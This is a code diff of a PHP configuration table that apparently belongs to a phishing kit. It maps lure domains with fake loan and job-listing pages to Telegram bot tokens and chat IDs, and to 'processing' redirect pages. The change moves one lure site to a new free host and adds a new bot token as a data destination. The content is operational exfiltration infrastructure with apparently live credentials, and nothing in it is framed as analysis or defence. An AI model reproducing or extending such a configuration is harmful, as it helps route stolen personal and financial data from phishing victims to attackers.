@@ -49,13 +49,14 @@ $site_map = [
         'redirect' => 'https://upstartsloan.42web.io/cache_site/processing.html'
     ],
 
-    'paysphere-hcr2.onrender.com' => [
+    'paysphere.42web.io' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            // ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']
+            
+            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']
 
         ],
-        'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/careers/all-listings.job.34092/processing.html'
+        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/processing.html'
     ],
 
 
